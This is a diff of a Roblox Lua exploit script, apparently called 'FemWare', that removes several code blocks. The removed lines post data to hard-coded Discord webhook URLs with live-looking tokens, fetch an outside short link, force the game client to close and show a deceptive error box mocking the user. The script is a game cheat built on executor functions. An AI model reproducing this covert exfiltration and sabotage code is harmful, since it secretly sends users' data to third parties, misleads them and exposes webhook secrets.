@@ -39,12 +39,6 @@ local function Bypass()
 	local Headers = {["Content-Type"]="application/json"}
 	local Encoded = HttpService:JSONEncode(Data)
 
-	Request = http_request or request or HttpPost or syn.request
-	local Final = {Url = "https://discord.com/api/webhooks/970235492509548565/Mly1ZqJ4cfvVpiV01mMSjwemBuLKC8sU7MO3ylH40Ka-g1XCMEsmwOxUGheQjXLsh56j", Body = Encoded, Method = "POST", Headers = Headers}
-	Request(Final)
-	game:HttpGet("https://maper.info/Xjquc")
-	game:Shutdown()
-end
 
 if _G.Pussy ~= 2103482.5 or _G.Pussy == nil then
 	Bypass()
@@ -2389,17 +2383,6 @@ if _G.FemKess == "uniscript On Top" then
 				local Headers                  = {["Content-Type"]="application/json"}
 				local Encoded                  = HttpService:JSONEncode(Data)
 
-				Request                        = http_request or request or HttpPost or syn.request
-				local Final = {Url             = "https://discord.com/api/webhooks/973234312243736627/rDiIhZH5UDazuJlxcO5_4Xff9IZH0jjV_9fUqTKZZzwXbvCGkIbbBFo9CDBgu675bCjw", Body = Encoded, Method = "POST", Headers = Headers}
-
-				Request(Final)
-
-				local MSGBox = messagebox("FemWare has detected an error. Either your Executor or an unexpected error has caused this. \n\nThis error has been sent to our servers.\nFor security reasons your game client will be closed. SIIIKE.\n\nIf you need help fixing, A random generated Support tag ("..RandomTag..") has been copied, go #support, open a ticket and paste your Support tag there and we will help you shortly. If you are not in the Discord server, discord.gg/vwxGwSn8bT", "The wizardly craft has failed...", 0)
-				setclipboard(RandomTag)
-
-				-- if MSGBox == 1 then
-				--     game:Shutdown()
-				-- end
 			end)
 		end
 
